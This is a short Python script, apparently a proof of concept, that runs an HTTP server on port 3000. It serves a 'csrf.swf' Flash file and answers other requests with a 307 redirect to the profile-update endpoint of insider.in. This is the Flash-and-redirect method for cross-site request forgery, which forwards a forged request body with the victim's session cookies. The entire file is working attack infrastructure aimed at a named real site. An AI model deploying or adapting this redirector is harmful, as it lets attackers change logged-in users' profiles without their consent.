
from http import server as BaseHTTPServer
import time
import sys

HOST = '0.0.0.0' 
PORT = 3000

class RedirectHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_POST(s):
        print("Inside POST",s.path)
       # dir(s)
        if s.path == '/csrf.swf':
           s.send_response(200)
           s.send_header("Content-Type","application/x-shockwave-flash")
           s.end_headers()
           s.wfile.write(open("csrf.swf", "rb").read())
           return 
        s.send_response(307)
        s.send_header("Location", "https://insider.in/users/updateProfile")
        s.end_headers()
    def do_GET(s):
        print(s.path)
        s.do_POST()
    
if __name__ == '__main__':
    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class((HOST, PORT), RedirectHandler)
    print(time.asctime(), "Server Starts - %s:%s" % (HOST, PORT))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print(time.asctime(), "Server Stops - %s:%s" % (HOST, PORT))